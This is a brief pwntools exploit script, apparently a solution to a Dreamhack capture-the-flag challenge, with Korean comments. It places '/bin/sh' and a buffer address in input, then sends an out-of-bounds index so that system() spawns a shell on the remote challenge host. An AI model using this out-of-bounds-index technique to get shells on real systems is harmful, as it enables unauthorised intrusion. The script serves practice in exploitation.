from pwn import *

context.arch = "i386"

p = remote("host3.dreamhack.games", 14448)

payload = b"/bin/sh" + b"\x00"  # 8바이트를 맞춰주기 위해 b'\x00'을 추가해줘야함
payload += p32(0x804A0AC)
# name의 주소 (system의 인자에는 "/bin/sh" 문자열 자체가 아닌 해당 문자열의 주소가 들어가야함)
p.send(payload)

# &name - &command = 76 이므로, 32-bit에서 char *의 크기인 4byte만큼 index 19차이가 나고, name의 주소는 8byte 뒤에 입력되어 있어서 4byte만큼 2번 더 가야함
idx = 19 + 2
p.sendline(str(idx).encode())  # scanf("%d")에 입력하기 때문
# p.sendline(b'21')             # 그냥 이렇게 써도 됨

p.interactive()
